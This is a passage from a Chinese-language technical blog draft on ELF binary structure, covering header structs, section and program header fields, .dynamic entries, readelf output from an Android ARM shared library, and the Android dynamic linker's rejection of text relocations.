解释：段在内存中的虚拟地址。在加载时，系统会将该段加载到进程的这个虚拟地址处。\n\n5. **`p_paddr`** (Segment physical address):\n   - 类型：`Elf64_Addr`（64位无符号整数）\n   - 解释：段的物理地址，主要用于与硬件相关的系统中。在大多数操作系统中，这个值通常与 `p_vaddr` 相同或者不使用。\n\n6. **`p_filesz`** (Segment size in file):\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段在文件中的大小，以字节为单位。\n\n7. **`p_memsz`** (Segment size in memory):\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段在内存中的大小，以字节为单位。`p_memsz` 可以比 `p_filesz` 大，这种情况通常发生在 BSS 段（未初始化的数据段），在内存中需要占用更多空间，但在文件中不占用空间。\n\n8. **`p_align`** (Segment alignment):\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：该段在文件和内存中的对齐要求。值为 0 或 1 表示不需要特殊对齐；否则，它必须是 2 的幂，段的文件偏移和内存地址必须符合该对齐要求。\n\n这些字段共同描述了每个程序段的基本属性，帮助系统在执行时正确加载并映射 ELF 文件的各个段。\nreadelf -l file.so\n```cpp\nElf file type is DYN (Shared object file)\nEntry point 0x0\nThere are 8 program headers, starting at offset 52\n\nProgram Headers:\n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\n  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4\n  LOAD           0x000000 0x00000000 0x00000000 0x02a48 0x02a48 R E 0x1000\n  LOAD           0x002e28 0x00003e28 0x00003e28 0x00220 0x00221 RW  0x1000\n  DYNAMIC        0x002e7c 0x00003e7c 0x00003e7c 0x00110 0x00110 RW  0x4\n  NOTE           0x000134 0x00000134 0x00000134 0x000bc 0x000bc R   0x4\n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10\n  EXIDX          0x00210c 0x0000210c 0x0000210c 0x001a8 0x001a8 R   0x4\n  GNU_RELRO      0x002e28 0x00003e28 0x00003e28 0x001d8 0x001d8 RW  0x4\n\n Section to Segment mapping:\n  Segment Sections...\n   00\n   01     .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d .gnu.version_r .rel.dyn .rel.plt .plt .text .ARM.exidx .ARM.extab .rodata\n   02     .data.rel.ro .fini_array .dynamic .got .data .bss\n   03     .dynamic\n   04     .note.android.ident .note.gnu.build-id\n   05\n   06     .ARM.exidx\n   07     .data.rel.ro .fini_array .dynamic .got\n```\n\n\n在 Android 6.0（API Level 23）之后，系统开始严格禁止 .so 文件中的 文本重定位（Text Relocations）\n\n1. 什么是文本重定位（Text Relocations）？\n\n\t•\t文本重定位指的是修改共享库代码段（通常被标记为只读）的内存地址，以便让其与实际加载的地址一致。\n\t•\t通常，编译 .so 文件时会生成位置无关代码（Position-Independent Code, PIC），这样生成的代码就能在运行时被加载到任何可用的内存地址，而无需修改代码段的内容。\n\t•\t但如果 .so 文件不支持位置无关代码，系统在加载时必须对其进行文本重定位，即修改代码段内的指令，以使其与实际的内存地址匹配。\n\n2. 为什么 Android 6.0 之后禁止文本重定位？\n\n\t•\t安全性: 文本重定位需要将代码段设为可写（writable），这违反了现代操作系统的安全原则，即代码段应是只读的，以防止恶意代码注入和利用漏洞进行攻击。文本重定位带来了潜在的安全漏洞，可能被恶意程序利用进行代码注入。\n\t•\t性能: 文本重定位会增加启动时的开销，因为系统需要在加载 .so 文件时对其进行修改。而且，这会导致共享库无法共享相同的物理内存页面，增加内存占用，降低性能。\n\t•\t更好的内存管理: 禁止文本重定位有助于 Android 系统实现更高效的内存管理，避免在多进程中加载相同 .so 文件时因为重定位而导致的内存浪费。\n\n3. 禁止文本重定位后，.so 文件的加载行为\n\n\t•\t禁止文本重定位后，系统要求 .so 文件必须是 位置无关代码（PIC），这意味着它可以加载到任何可用的内存地址，而不需要修改代码段的内容。\n\t•\t只要 .so 文件是用位置无关代码编译的（即 -fPIC 编译选项），它就可以在运行时加载到内存的任何地址，而不需要文本重定位。因此，Android 6.0 之后的 .so 文件并不会被加载到固定地址，而是由系统动态分配可用的内存地址。\n\n文本重定向代码分析\n这段代码来自于动态链接器的部分，主要用于处理 **动态段** 中的 `DT_TEXTREL` 标签。`DT_TEXTREL` 是 ELF 动态段（`.dynamic` 段）中的一个标识符，它表明该可执行文件或共享库（`.so` 文件）存在 **文本重定位（text relocations）**。文本重定位指的是在程序加载时，需要修改代码段（`.text` 段）中的内容来调整符号地址。\n\n### 代码分析\n```c\ntypedef struct {\n    Elf64_Sxword d_tag;     /* Dynamic entry type */\n    union {\n        Elf64_Xword d_val;  /* Integer value */\n        Elf64_Addr d_ptr;   /* Program virtual address */\n    } d_un;\n} Elf64_Dyn;\n```\n\n```cpp\ncase DT_TEXTREL:\n#if defined(__LP64__)\n    DL_ERR(\"\\\"%s\\\" has text relocations\", get_realpath());\n    return false;\n#else\n    has_text_relocations = true;\n    break;\n#endif\n```\n\n1. **`case DT_TEXTREL:`**:\n   - 这是在动态链接器中解析动态段（`.dynamic` 段）时的一个 `switch` 语句分支，处理 `DT_TEXTREL` 的场景。\n   - `DT_TEXTREL` 表示该共享库或可执行文件存在需要重定位的 `.text` 段，即代码段包含绝对地址引用，加载时需要动态修改。\n\n2. **`#if defined(__LP64__)`**:\n   - 这是一个 **条件编译宏**，用于检查当前系统是否是 **64 位架构**。`__LP64__` 是 GCC 或 Clang 编译器定义的一个宏，用来标识编译环境为 64 位的长指针模型（LP64 模型），即 `long` 和 `pointer` 类型在 64 位系统中为 64 位。\n   - **LP64 架构**: 在 64 位系统上，代码中的指针和 `long` 类型通常为 64 位。64 位系统通常强制要求 **代码段不可修改**，因为允许修改 `.text` 段可能带来安全风险。\n\n3. **`DL_ERR(\"\\\"%s\\\" has text relocations\", get_realpath());`**:\n   - 如果程序运行在 64 位架构上，并且发现 `.so` 文件中存在 `DT_TEXTREL`，动态链接器会调用 `DL_ERR` 函数打印错误信息。这里的 `get_realpath()` 用于获取当前正在处理的共享库的真实路径，并将其作为错误信息输出。\n   - 错误信息内容：`\"filename has text relocations\"`，表示当前文件存在文本重定位。\n\n4. **`return false;`**:\n   - 对于 64 位系统，一旦发现 `.so` 文件有文本重定位，动态链接器立即返回 `false`，表示拒绝加载该文件。这是因为现代 64 位系统通常禁止修改 `.text` 段以确保安全性，避免代码注入等攻击。\n\n5. **`#else` 分支**:\n   - 如果程序运行在 32 位架构上（即没有定义 `__LP64__`），动态链接器不会立即拒绝加载文件，而是将 `has_text_relocations` 变量设置为 `true`。\n   - 在 32 位系统上，尽管 `.text` 段的重定位被认为是不安全的，但仍然是被允许的，因此不会直接报错，而是继续加载该共享库。\n\n6. **`has_text_relocations = true;`**:\n   - 在 32 位系统上，动态链接器设置一个标志 `has_text_relocations` 为 `true`，记录当前 `.so` 文件有文本重定位。在后续的加载流程中，动态链接器可能会针对这个标志执行特殊处理，比如发出警告或做额外的安全检查。\n\n### 代码逻辑总结\n\n- **64 位系统（`__LP64__`）**:\n   - 如果当前系统是 64 位系统，并且该 `.so` 文件存在文本重定位 (`DT_TEXTREL`)，系统会直接报错，并拒绝加载该文件。这是因为现代 64 位系统严格要求代码段不可修改，以提高安全性。\n\n- **32 位系统（非 `__LP64__`）**:\n   - 如果当前系统是 32 位系统，虽然存在文本重定位，动态链接器仍然允许加载该文件，但会记录 `has_text_relocations = true`，表明这个文件有文本重定位。32 位系统的安全性要求较低，历史上允许文本重定位以支持不使用位置无关代码（PIC）的库。\n\n### 为什么 64 位系统不允许 Text Relocations？\n\n1. **安全性考虑**:\n   - 允许 `.text` 段可写会带来安全风险，攻击者可以利用这个机制修改代码段，进行代码注入等恶意攻击。\n   - 在 64 位系统上，严禁 `.text` 段的修改可以有效防止这类攻击。\n\n2. **现代系统的内存管理和性能优化**:\n   - 现代 64 位系统采用了更高级的内存管理和优化技术，`.text` 段通常是共享的内存页。如果允许修改 `.text` 段，会导致每个进程必须拥有自己独立的内存页，增加内存占用，破坏共享机制。\n   - 禁止文本重定位有助于提高性能和减少内存占用。\n\n### 总结\n\n这段代码检查动态库是否存在 `DT_TEXTREL`（文本重定位）标签。在 64 位系统中，检测到文本重定位后，动态链接器会拒绝加载该 `.so` 文件并抛出错误，而在 32 位系统中，虽然允许文本重定位，但会设置标志 `has_text_relocations` 为 `true`，以便后续做相应的处理。这种区别源于 64 位系统对安全性和性能的更高要求。\n\n#define DT_TEXTREL\t22\n\n00 00 00 03","source":"_drafts/elf.md","raw":"elf解析：\n链接视图\nsection header table\n\n运行视图\nprograme header table\n\n为什么要有运行视图\n1. 相同权限的section 放在一起\n2. 如果用section 来加载到内存中，如果这个节的大小为1025KB,内存分页的大小为1024KB,那么多出的1KB空间，需要另外申请一个页，浪费内存\n\n\n```cpp\n/* 32-bit ELF base types. */\ntypedef __u32\tElf32_Addr;\ntypedef __u16\tElf32_Half;\ntypedef __u32\tElf32_Off;\ntypedef __s32\tElf32_Sword;\ntypedef __u32\tElf32_Word;\n\n/* 64-bit ELF base types. */\ntypedef __u64\tElf64_Addr;\ntypedef __u16\tElf64_Half;\ntypedef __s16\tElf64_SHalf;\ntypedef __u64\tElf64_Off;\ntypedef __s32\tElf64_Sword;\ntypedef __u32\tElf64_Word;\ntypedef __u64\tElf64_Xword;\ntypedef __s64\tElf64_Sxword;\n\n```\n\n以下为定义的文件头：\n![alt text](../pic/elf_header.png)\n\n```cpp\ninclude/uapi/linux/elf.h\n\n#define EI_NIDENT\t16\n\ntypedef struct elf32_hdr {\n  unsigned char\te_ident[EI_NIDENT]; //16字节的魔数等\n  Elf32_Half\te_type; //文件类型\n  Elf32_Half\te_machine; //需要的体系结构\n  Elf32_Word\te_version; //版本\n  Elf32_Addr\te_entry;  /* Entry point */\n  Elf32_Off\te_phoff;\n  Elf32_Off\te_shoff;\n  Elf32_Word\te_flags;\n  Elf32_Half\te_ehsize; // 表示ELF header 大小 2字节\n  Elf32_Half\te_phentsize; // 表示program header table 每个条目的大小\n  Elf32_Half\te_phnum; // 表示program header table 包含的条目数\n  Elf32_Half\te_shentsize; // 表示section header table 每个条目的大小\n  Elf32_Half\te_shnum;    // 表示section header table 包含的条目数\n  Elf32_Half\te_shstrndx; //包含section 名称的字符串是第几个\n} Elf32_Ehdr;\n\ntypedef struct elf64_hdr {\n  unsigned char\te_ident[EI_NIDENT];\t/* ELF \"magic number\" */\n  Elf64_Half e_type;\n  Elf64_Half e_machine;\n  Elf64_Word e_version;\n  Elf64_Addr e_entry;\t\t/* Entry point virtual address */\n  Elf64_Off e_phoff;\t\t/* Program header table file offset */\n  Elf64_Off e_shoff;\t\t/* Section header table file offset */\n  Elf64_Word e_flags;\n  Elf64_Half e_ehsize;\n  Elf64_Half e_phentsize;\n  Elf64_Half e_phnum;\n  Elf64_Half e_shentsize;\n  Elf64_Half e_shnum;\n  Elf64_Half e_shstrndx;\n} Elf64_Ehdr;\n\n```\nreadelf -h file.so\n```r\nELF Header:\n  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00\n  Class:                             ELF32\n  Data:                              2's complement, little endian\n  Version:                           1 (current)\n  OS/ABI:                            UNIX - System V\n  ABI Version:                       0\n  Type:                              DYN (Shared object file)\n  Machine:                           ARM\n  Version:                           0x1\n  Entry point address:               0x0\n  Start of program headers:          52 (bytes into file)\n  Start of section headers:          12892 (bytes into file)\n  Flags:                             0x5000200, Version5 EABI, soft-float ABI\n  Size of this header:               52 (bytes)\n  Size of program headers:           32 (bytes)\n  Number of program headers:         8\n  Size of section headers:           40 (bytes)\n  Number of section headers:         27\n  Section header string table index: 26\n```\n\n链接视图：\nSHT(section header table)\nSHT是程序编译链接之后按照功能逻辑组织代码数据的方式，sht位于elf文件的最后\n源码编译后生成的不同性质的数据会分门别列的放置，因此出现代码段，数据段，符号段\n![alt text](../pic/code_sht.JPG)\n\n![alt text](../pic/sht.png)\n```cpp\n/* sh_type */\n#define SHT_NULL\t0\n#define SHT_PROGBITS\t1\n#define SHT_SYMTAB\t2\n#define SHT_STRTAB\t3\n#define SHT_RELA\t4\n#define SHT_HASH\t5\n#define SHT_DYNAMIC\t6\n#define SHT_NOTE\t7\n#define SHT_NOBITS\t8\n#define SHT_REL\t\t9\n#define SHT_SHLIB\t10\n#define SHT_DYNSYM\t11\n#define SHT_NUM\t\t12\n#define SHT_LOPROC\t0x70000000\n#define SHT_HIPROC\t0x7fffffff\n#define SHT_LOUSER\t0x80000000\n#define SHT_HIUSER\t0xffffffff\n\n/* sh_flags */\n#define SHF_WRITE\t\t0x1\n#define SHF_ALLOC\t\t0x2\n#define SHF_EXECINSTR\t\t0x4\n#define SHF_RELA_LIVEPATCH\t0x00100000\n#define SHF_RO_AFTER_INIT\t0x00200000\n#define SHF_MASKPROC\t\t0xf0000000\n\n/* special section indexes */\n#define SHN_UNDEF\t0\n#define SHN_LORESERVE\t0xff00\n#define SHN_LOPROC\t0xff00\n#define SHN_HIPROC\t0xff1f\n#define SHN_LIVEPATCH\t0xff20\n#define SHN_ABS\t\t0xfff1\n#define SHN_COMMON\t0xfff2\n#define SHN_HIRESERVE\t0xffff\n \ntypedef struct elf32_shdr {\n  Elf32_Word\tsh_name; //节名\n  Elf32_Word\tsh_type; //节类型\n  Elf32_Word\tsh_flags; //节标志位\n  Elf32_Addr\tsh_addr;  //虚拟地址\n  Elf32_Off\tsh_offset; //文件偏移地址\n  Elf32_Word\tsh_size; //节大小\n  Elf32_Word\tsh_link; \n  Elf32_Word\tsh_info;\n  Elf32_Word\tsh_addralign; //对齐偏移\n  Elf32_Word\tsh_entsize; \n} Elf32_Shdr;\n\ntypedef struct elf64_shdr {\n  Elf64_Word sh_name;\t\t/* Section name, index in string tbl */\n  Elf64_Word sh_type;\t\t/* Type of section */\n  Elf64_Xword sh_flags;\t\t/* Miscellaneous section attributes */\n  Elf64_Addr sh_addr;\t\t/* Section virtual addr at execution */\n  Elf64_Off sh_offset;\t\t/* Section file offset */\n  Elf64_Xword sh_size;\t\t/* Size of section in bytes */\n  Elf64_Word sh_link;\t\t/* Index of another section */\n  Elf64_Word sh_info;\t\t/* Additional section information */\n  Elf64_Xword sh_addralign;\t/* Section alignment */\n  Elf64_Xword sh_entsize;\t/* Entry size if section holds table */\n} Elf64_Shdr;\n    \n```\n在 ELF 文件中，`shdr` 是 `Section Header` 的缩写，表示段头表（Section Header Table）中的一项。段头表描述了 ELF 文件中各个段的基本信息，帮助系统在加载或链接时正确处理各个段。\n\n让我们逐一解释 `Elf64_Shdr` 结构体中的各个字段：\n\n1. **`sh_name` (Section name, index in string table)**：\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：这是一个指向字符串表的索引，字符串表保存了段的名称。通过该索引，可以找到对应的段名称。\n\t在段头表中的 sh_name 字段记录了一个索引值。\n\t该索引值对应于 .shstrtab 段中的偏移量。\n\t在 .shstrtab 段中，从该偏移量开始的字符串就是该段的名称。\n\n2. **`sh_type` (Type of section)**：\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：该字段表示段的类型，常见的类型有：\n     - `SHT_NULL`：空段\n     - `SHT_PROGBITS`：程序数据段\n     - `SHT_SYMTAB`：符号表段\n     - `SHT_STRTAB`：字符串表段\n     - `SHT_RELA`：带重定位的符号段等\n\n3. **`sh_flags` (Miscellaneous section attributes)**：\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段的属性标志，可能的标志有：\n     - `SHF_WRITE`：段包含可写数据\n     - `SHF_ALLOC`：段需要被加载到内存中\n     - `SHF_EXECINSTR`：段包含可执行指令\n\n4. **`sh_addr` (Section virtual addr at execution)**：\n   - 类型：`Elf64_Addr`（64位无符号整数）\n   - 解释：段在内存中的虚拟地址。如果段需要被加载到内存中（如代码段或数据段），该地址表示它在进程地址空间中的位置。对于非加载段，这个值为 0。\n\n5. **`sh_offset` (Section file offset)**：\n   - 类型：`Elf64_Off`（64位无符号整数）\n   - 解释：段在文件中的偏移量，指明该段数据从文件的哪个位置开始。\n\n6. **`sh_size` (Size of section in bytes)**：\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段的大小，以字节为单位。\n\n7. **`sh_link` (Index of another section)**：\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：此字段与段的类型相关。对于符号表，它通常是关联字符串表的索引；对于重定位段，它可能是关联符号表的索引。\n\n8. **`sh_info` (Additional section information)**：\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：该字段也与段类型相关。例如，对于符号表，它表示局部符号的起始索引；对于重定位段，它可能是相关节的索引。\n\n9. **`sh_addralign` (Section alignment)**：\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段的对齐要求。段必须按此对齐方式在内存中对齐。如果对齐值为 0 或 1，则表示没有特殊对齐要求。\n\n10. **`sh_entsize` (Entry size if section holds table)**：\n    - 类型：`Elf64_Xword`（64位无符号整数）\n    - 解释：如果段包含一个表（如符号表或重定位表），此字段指明每个表项的大小。如果段不是表，则此字段为 0。\n\n这些字段共同描述了每个段的基本属性，使操作系统或链接器能够正确处理 ELF 文件中的各个段。\n\n\n连接器相关的 .dynamic section\n\n**`.dynamic` 段** 在 ELF 文件中是一个非常重要的段，它用于描述可执行文件或共享对象文件在运行时与动态链接器之间的互动。它包含了与动态链接相关的各种信息，比如所依赖的共享库、全局偏移表（GOT）、符号表、重定位表等。\n\n`.dynamic` 段的内容是由一系列 `Elf64_Dyn` 结构体组成的。每个 `Elf64_Dyn` 结构体有两个成员，分别是 `d_tag` 和 `d_un`，其中 `d_tag` 指定了动态条目的类型，而 `d_un` 则包含相应的值或地址。\n\n`Elf64_Dyn` 结构体的定义如下：\n\n```c\ntypedef struct {\n    Elf64_Sxword d_tag;     /* Dynamic entry type */\n    union {\n        Elf64_Xword d_val;  /* Integer value */\n        Elf64_Addr d_ptr;   /* Program virtual address */\n    } d_un;\n} Elf64_Dyn;\n```\n\n### 详细介绍 `.dynamic` 段的常用标志（`d_tag` 字段）\n\n每个动态条目（entry）的 `d_tag` 字段表示该条目的类型，`d_un` 存储的值可能是一个整数（`d_val`）或者是一个虚拟地址（`d_ptr`）。以下是 `.dynamic` 段中常用的标志及其含义：\n\n1. **`DT_NEEDED`**\n   - 解释：指向依赖的共享库名称的字符串表索引。每个 `DT_NEEDED` 条目指定了一个程序运行时所需的共享库。\n   - 类型：`d_un.d_val` 指向字符串表中的索引。\n\n2. **`DT_PLTRELSZ`**\n   - 解释：`.rel.plt` 或 `.rela.plt` 段的大小，即重定位表的大小，主要用于跳转表（PLT）。\n   - 类型：`d_un.d_val` 是段的大小（以字节为单位）。\n\n3. **`DT_PLTGOT`**\n   - 解释：全局偏移表（Global Offset Table, GOT）的地址。GOT 是用于处理动态符号解析的一个数据结构。\n   - 类型：`d_un.d_ptr` 是 GOT 段的虚拟地址。\n\n4. **`DT_HASH`**\n   - 解释：指向符号哈希表的地址。用于符号查找加速。\n   - 类型：`d_un.d_ptr` 是哈希表的虚拟地址。\n\n5. **`DT_STRTAB`**\n   - 解释：指向字符串表的地址。字符串表保存符号名、库名等。\n   - 类型：`d_un.d_ptr` 是字符串表的虚拟地址。\n\n6. **`DT_SYMTAB`**\n   - 解释：指向符号表的地址。符号表保存了符号（如函数、变量）的地址和类型信息。\n   - 类型：`d_un.d_ptr` 是符号表的虚拟地址。\n\n7. **`DT_RELA`**\n   - 解释：指向带加法重定位表（`.rela` 段）的地址。\n   - 类型：`d_un.d_ptr` 是 `.rela` 重定位表的虚拟地址。\n\n8. **`DT_RELASZ`**\n   - 解释：`.rela` 段的大小（以字节为单位）。\n   - 类型：`d_un.d_val` 是段的大小。\n\n9. **`DT_STRSZ`**\n   - 解释：字符串表的大小（以字节为单位）。\n   - 类型：`d_un.d_val` 是字符串表的大小。\n\n10. **`DT_SYMENT`**\n    - 解释：符号表中每个条目的大小（以字节为单位）。\n    - 类型：`d_un.d_val` 是符号表条目的大小。\n\n11. **`DT_INIT`**\n    - 解释：程序或共享库初始化函数的地址。当程序启动或共享库被加载时，该函数会被调用。\n    - 类型：`d_un.d_ptr` 是初始化函数的地址。\n\n12. **`DT_FINI`**\n    - 解释：程序或共享库的终止函数的地址。当程序退出或共享库被卸载时，该函数会被调用。\n    - 类型：`d_un.d_ptr` 是终止函数的地址。\n\n13. **`DT_REL`**\n    - 解释：指向不带加法重定位表（`.rel` 段）的地址。\n    - 类型：`d_un.d_ptr` 是 `.rel` 段的虚拟地址。\n\n14. **`DT_RELSZ`**\n    - 解释：`.rel` 段的大小（以字节为单位）。\n    - 类型：`d_un.d_val` 是 `.rel` 段的大小。\n\n15. **`DT_JMPREL`**\n    - 解释：指向 `.rel.plt` 或 `.rela.plt` 段中的跳转表的重定位条目的地址。\n    - 类型：`d_un.d_ptr` 是 `.rel.plt` 或 `.rela.plt` 段的虚拟地址。\n\n16. **`DT_BIND_NOW`**\n    - 解释：指示动态链接器立即解析所有符号，而不是按需解析。这通常用于提高运行时性能。\n    - 类型：此标志仅用作指示（无关联值）。\n\n17. **`DT_DEBUG`**\n    - 解释：用于调试信息，动态链接器可以将一些调试相关信息放入此字段。\n    - 类型：`d_un.d_ptr` 是指向调试信息结构的虚拟地址。\n\n18. **`DT_FLAGS`**\n    - 解释：用于表示一些与动态链接相关的标志。常见标志包括：\n        - `DF_ORIGIN`：允许使用 `$ORIGIN` 来解析动态库路径。\n        - `DF_SYMBOLIC`：优先使用定义在可执行文件中的符号，而非动态库中的符号。\n        - `DF_TEXTREL`：允许对只读段进行重定位（通常意味着不安全的代码）。\n        - `DF_BIND_NOW`：所有符号都应立即绑定，而不是延迟到运行时。\n\n19. **`DT_RUNPATH`**\n    - 解释：运行时库搜索路径的地址。它提供了一个库搜索路径，动态链接器将在这个路径中查找所需的共享库。\n    - 类型：`d_un.d_ptr` 是运行时路径字符串的地址。\n\n20. **`DT_SONAME`**\n    - 解释：共享库的名字。动态链接器会使用这个名字来查找库文件。\n    - 类型：`d_un.d_val` 是字符串表中的索引，指向共享库名。\n\n21. **`DT_RPATH`**\n    - 解释：指定库搜索路径，类似于 `DT_RUNPATH`，但优先级不同。`RPATH` 通常在老版本中使用，`RUNPATH` 更现代。\n    - 类型：`d_un.d_ptr` 是运行时库路径字符串的地址。\n\n### 总结\n\n`.dynamic` 段是 ELF 文件中用于动态链接的核心结构，它包含了动态链接器在加载时所需的各种信息。每个 `d_tag` 对应不同类型的动态条目，链接器通过这些条目来处理库依赖、符号解析、重定位等工作。\n\n```r\nThere are 27 section headers, starting at offset 0x325c:\n\nSection Headers:\n  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al\n  [ 0]                   NULL            00000000 000000 000000 00      0   0  0\n  [ 1] .note.androi[...] NOTE            00000134 000134 000098 00   A  0   0  4\n  [ 2] .note.gnu.bu[...] NOTE            000001cc 0001cc 000024 00   A  0   0  4\n  [ 3] .dynsym           DYNSYM          000001f0 0001f0 0001c0 10   A  4   1  4\n  [ 4] .dynstr           STRTAB          000003b0 0003b0 00018e 00   A  0   0  1\n  [ 5] .gnu.hash         GNU_HASH        00000540 000540 000060 04   A  3   0  4\n  [ 6] .hash             HASH            000005a0 0005a0 0000bc 04   A  3   0  4\n  [ 7] .gnu.version      VERSYM          0000065c 00065c 000038 02   A  3   0  2\n  [ 8] .gnu.version_d    VERDEF          00000694 000694 00001c 00   A  4   1  4\n  [ 9] .gnu.version_r    VERNEED         000006b0 0006b0 000040 00   A  4   2  4\n  [10] .rel.dyn          REL             000006f0 0006f0 000178 08   A  3   0  4\n  [11] .rel.plt          REL             00000868 000868 000080 08  AI  3  20  4\n  [12] .plt              PROGBITS        000008e8 0008e8 0000d4 00  AX  0   0  4\n  [13] .text             PROGBITS        000009bc 0009bc 001750 00  AX  0   0  4\n  [14] .ARM.exidx        ARM_EXIDX       0000210c 00210c 0001a8 08  AL 13   0  4\n  [15] .ARM.extab        PROGBITS        000022b4 0022b4 000198 00   A  0   0  4\n  [16] .rodata           PROGBITS        0000244c 00244c 0005fc 01 AMS  0   0  1\n  [17] .data.rel.ro      PROGBITS        00003e28 002e28 00004c 00  WA  0   0  4\n  [18] .fini_array       FINI_ARRAY      00003e74 002e74 000008 04  WA  0   0  4\n  [19] .dynamic          DYNAMIC         00003e7c 002e7c 000110 08  WA  4   0  4\n  [20] .got              PROGBITS        00003f8c 002f8c 000074 00  WA  0   0  4\n  [21] .data             PROGBITS        00004000 003000 000048 00  WA  0   0  4\n  [22] .bss              NOBITS          00004048 003048 000001 00  WA  0   0  1\n  [23] .comment          PROGBITS        00000000 003048 0000b6 01  MS  0   0  1\n  [24] .note.gnu.go[...] NOTE            00000000 003100 00001c 00      0   0  4\n  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 00311c 00002e 00      0   0  1\n  [26] .shstrtab         STRTAB          00000000 00314a 00010f 00      0   0  1\nKey to Flags:\n  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),\n  L (link order), O (extra OS processing required), G (group), T (TLS),\n  C (compressed), x (unknown), o (OS specific), E (exclude),\n  D (mbind), y (purecode), p (processor specific)\n```\n各个节的解释：\nhttps://naotu.baidu.com/file/953beb87c9258f4111f4c105ed03c36e\n\n\n运行视图：\nPHT\nprogram header table\n其存在，使得操作系统加载程序时尽可能少的产生内存碎片，尽可能的提高内存使用率。\n\n![alt text](../pic/pht.png)\n\n```cpp\n/* These constants define the permissions on sections in the program\n   header, p_flags. */\n#define PF_R\t\t0x4\n#define PF_W\t\t0x2\n#define PF_X\t\t0x1\n\ntypedef struct elf32_phdr {\n  Elf32_Word\tp_type;\n  Elf32_Off\tp_offset;\n  Elf32_Addr\tp_vaddr;\n  Elf32_Addr\tp_paddr;\n  Elf32_Word\tp_filesz;\n  Elf32_Word\tp_memsz;\n  Elf32_Word\tp_flags;\n  Elf32_Word\tp_align;\n} Elf32_Phdr;\n\ntypedef struct elf64_phdr {\n  Elf64_Word p_type;\n  Elf64_Word p_flags;\n  Elf64_Off p_offset;\t\t/* Segment file offset */\n  Elf64_Addr p_vaddr;\t\t/* Segment virtual address */\n  Elf64_Addr p_paddr;\t\t/* Segment physical address */\n  Elf64_Xword p_filesz;\t\t/* Segment size in file */\n  Elf64_Xword p_memsz;\t\t/* Segment size in memory */\n  Elf64_Xword p_align;\t\t/* Segment alignment, file & memory */\n} Elf64_Phdr;\n```\n在 ELF 文件中，`phdr` 是 **Program Header**（程序头表）的缩写，描述了可执行文件或共享对象文件的段（segment）信息。与段头表（Section Header）不同，程序头表用于加载时描述如何在内存中布置文件的各个段。\n\n让我们逐一解释 `Elf64_Phdr` 结构体中的各个字段：\n\n1. **`p_type`** (Segment type):\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：指明该段的类型，常见的值包括：\n     - `PT_NULL`：未使用的段\n     - `PT_LOAD`：可加载段\n     - `PT_DYNAMIC`：动态链接信息段\n     - `PT_INTERP`：包含解释器路径的段\n     - `PT_NOTE`：包含注释的段\n\n2. **`p_flags`** (Segment flags):\n   - 类型：`Elf64_Word`（32位无符号整数）\n   - 解释：段的权限标志，可能的标志包括：\n     - `PF_R`：可读段\n     - `PF_W`：可写段\n     - `PF_X`：可执行段\n   这些标志决定了段在内存中的访问权限。\n\n3. **`p_offset`** (Segment file offset):\n   - 类型：`Elf64_Off`（64位无符号整数）\n   - 解释：该段在文件中的偏移量，指明该段数据从文件的哪个位置开始。\n\n4. **`p_vaddr`** (Segment virtual address):\n   - 类型：`Elf64_Addr`（64位无符号整数）\n   - 解释：段在内存中的虚拟地址。在加载时，系统会将该段加载到进程的这个虚拟地址处。\n\n5. **`p_paddr`** (Segment physical address):\n   - 类型：`Elf64_Addr`（64位无符号整数）\n   - 解释：段的物理地址，主要用于与硬件相关的系统中。在大多数操作系统中，这个值通常与 `p_vaddr` 相同或者不使用。\n\n6. **`p_filesz`** (Segment size in file):\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段在文件中的大小，以字节为单位。\n\n7. **`p_memsz`** (Segment size in memory):\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：段在内存中的大小，以字节为单位。`p_memsz` 可以比 `p_filesz` 大，这种情况通常发生在 BSS 段（未初始化的数据段），在内存中需要占用更多空间，但在文件中不占用空间。\n\n8. **`p_align`** (Segment alignment):\n   - 类型：`Elf64_Xword`（64位无符号整数）\n   - 解释：该段在文件和内存中的对齐要求。值为 0 或 1 表示不需要特殊对齐；否则，它必须是 2 的幂，段的文件偏移和内存地址必须符合该对齐要求。\n\n这些字段共同描述了每个程序段的基本属性，帮助系统在执行时正确加载并映射 ELF 文件的各个段。\nreadelf -l file.so\n```cpp\nElf file type is DYN (Shared object file)\nEntry point 0x0\nThere are 8 program headers, starting at offset 52\n\nProgram Headers:\n  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align\n  PHDR           0x000034 0x00000034 0x00000034 0x00100 0x00100 R   0x4\n  LOAD           0x000000 0x00000000 0x00000000 0x02a48 0x02a48 R E 0x1000\n  LOAD           0x002e28 0x00003e28 0x00003e28 0x00220 0x00221 RW  0x1000\n  DYNAMIC        0x002e7c 0x00003e7c 0x00003e7c 0x00110 0x00110 RW  0x4\n  NOTE           0x000134 0x00000134 0x00000134 0x000bc 0x000bc R   0x4\n  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10\n  EXIDX          0x00210c 0x0000210c 0x0000210c 0x001a8 0x001a8 R   0x4\n  GNU_RELRO      0x002e28 0x00003e28 0x00003e28 0x001d8 0x001d8 RW  0x4\n\n Section to Segment mapping:\n  Segment Sections...\n   00\n   01     .note.android.ident .note.gnu.build-id .dynsym .dynstr .gnu.hash .hash .gnu.version .gnu.version_d 